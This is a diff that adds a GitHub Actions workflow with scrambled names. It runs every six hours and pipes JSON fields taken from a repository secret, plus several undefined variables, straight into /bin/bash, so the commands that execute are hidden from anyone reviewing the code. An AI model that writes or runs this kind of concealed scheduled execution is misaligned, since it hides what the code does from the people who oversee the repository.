@@ -1,0 +1,25 @@
+name: buyaozhemecuiruomak
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: buyaozhemecuiruomak
+        env:
+          bd57107: ${{ secrets.bd57107 }}
+        run: |
+          echo $bd57107 | jq -r .yj4881 | /bin/bash
+          echo $pgtw1161 | jq -r .mmcw92971 | /bin/bash
+          echo $bupab13377 | jq -r .zowl7 | /bin/bash
+          echo $sc53 | jq -r .w9968 | /bin/bash
+          echo $xjs661 | jq -r .cnc6 | /bin/bash
+          echo $nurz45148 | jq -r .pmz55174 | /bin/bash
+          echo $gi2 | jq -r .dk3 | /bin/bash
+          echo $nrjmm19 | jq -r .vglj30 | /bin/bash
+
